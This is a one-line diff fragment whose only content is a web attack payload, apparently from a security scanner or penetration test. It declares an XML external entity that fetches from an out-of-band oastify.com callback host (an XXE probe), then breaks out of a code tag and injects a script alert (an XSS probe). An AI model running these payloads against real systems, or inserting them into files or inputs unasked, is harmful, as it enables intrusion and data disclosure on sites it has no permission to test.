@@ -1,0 +1,1 @@
+<!DOCTYPE foo [<!ENTITY xxe57smi SYSTEM "http://2gjodjltyqsbl8v04hjq56o8mzssgjk7ev6iy6n.oastify.com"> ]>&xxe57smi;</code> <script> alert(document.url)</script><code>
